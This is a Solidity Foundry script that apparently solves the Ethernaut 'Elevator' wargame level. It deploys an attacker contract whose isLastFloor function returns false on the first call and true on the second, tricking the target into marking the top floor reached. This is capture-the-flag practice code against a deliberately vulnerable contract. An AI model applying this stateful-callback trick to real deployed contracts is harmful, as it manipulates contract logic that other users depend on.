//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Elevator}  from "src/ethernaut11.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut10Script is Script{
    Elevator instance = Elevator(0x6e944eE85EE41F35D8Adcc7B7a3DE07bEb2f6dF1);

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attacker a = new attacker();
        a.attack();
    
        vm.stopBroadcast();
    }
}
contract attacker{
    Elevator instance = Elevator(0x6e944eE85EE41F35D8Adcc7B7a3DE07bEb2f6dF1);
    uint256 count =0;
    function attack() external payable{
        instance.goTo(10);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
       count++;
       if(count >= 2){
           return true;
       }
        return false;
    }

    
}

